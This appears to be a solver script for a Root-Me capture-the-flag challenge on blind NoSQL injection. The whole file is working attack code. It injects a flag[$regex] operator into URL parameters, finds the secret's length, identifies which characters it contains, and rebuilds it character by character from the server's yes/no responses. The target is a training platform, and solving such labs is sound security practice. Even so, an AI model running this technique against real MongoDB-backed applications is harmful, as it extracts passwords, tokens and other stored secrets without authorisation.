import urllib3
import time
import sys

wordlists = open('wordlist.txt','r').read().splitlines()
words_in_flag = []
flag_length = 0
flag = ""

http = urllib3.PoolManager()

print("Fuzzing Flag length and words...")
while True:
     time.sleep(1.5)
     url = "http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=.{"+ str(flag_length) +"}"
     response = http.request('GET', url)
     content = response.data.decode('utf-8')

     if "Yeah this is the flag" in content:
          flag_length += 1
     else:
          flag_length -= 1
          print("Flag length is - ", flag_length)
          break

print("")

for payload in wordlists:
     time.sleep(1.5)
     url = f"http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]={payload}"
     response = http.request('GET', url)
     content = response.data.decode('utf-8')

     if "Yeah this is the flag" in content:
          words_in_flag.append(payload)
          print("Characters in Flag - ", payload)

print("Words in flag are - " , words_in_flag)
print("\nFuzzing Flag...")

for fuzz in range(flag_length):
     for word in words_in_flag:
          time.sleep(1.5)
          url = f"http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^{flag}{word}"
          response = http.request('GET', url)
          content = response.data.decode('utf-8')

          if "Yeah this is the flag" in content:
               flag += word
               print("Flag is " + flag)
               break

print("[+] Final Flag is - " + flag)
